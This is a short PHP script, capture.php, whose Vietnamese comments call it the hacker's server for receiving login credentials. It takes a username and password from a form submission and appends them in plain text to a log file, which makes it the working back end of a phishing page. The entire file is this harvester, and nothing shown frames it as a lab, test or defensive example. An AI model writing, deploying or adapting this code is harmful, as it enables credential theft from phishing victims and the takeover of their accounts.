<?php
// capture.php - Máy chủ của hacker nhận thông tin đăng nhập
$logfile = 'log.txt';
$username = $_POST['username'];
$password = $_POST['password'];

// Ghi thông tin vào file log.txt
file_put_contents($logfile, "Username: $username, Password: $password\n", FILE_APPEND);

// Có thể hiển thị hoặc xử lý thông tin này thêm nếu cần
?>
